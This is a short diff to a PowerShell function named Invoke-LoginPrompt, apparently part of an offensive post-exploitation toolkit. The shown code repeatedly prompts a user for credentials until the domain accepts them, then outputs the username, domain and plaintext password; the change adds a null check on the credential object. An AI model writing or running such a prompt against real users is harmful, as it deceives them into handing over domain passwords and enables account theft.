@@ -24,7 +24,8 @@ Function Invoke-LoginPrompt{
         $username = "$env:username"
         $domain = "$env:userdomain"
         $full = "$domain" + "\" + "$username"
-        $password = $cred.GetNetworkCredential().password
+        $password = ""
+        If ($cred) { $password = $cred.GetNetworkCredential().password }
     } While($DS.ValidateCredentials("$full", "$password") -ne $True)
     $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
 }
